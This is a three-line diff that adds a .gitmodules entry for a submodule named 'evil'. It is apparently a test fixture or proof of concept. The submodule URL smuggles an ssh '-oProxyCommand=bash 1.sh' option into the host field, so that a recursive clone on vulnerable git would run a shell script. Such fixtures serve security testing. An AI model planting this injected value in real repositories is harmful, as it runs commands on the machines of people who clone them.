@@ -1,0 +1,3 @@
+[submodule "evil"]
+	path = evil
+    url = ssh://"-oProxyCommand=bash 1.sh" /test
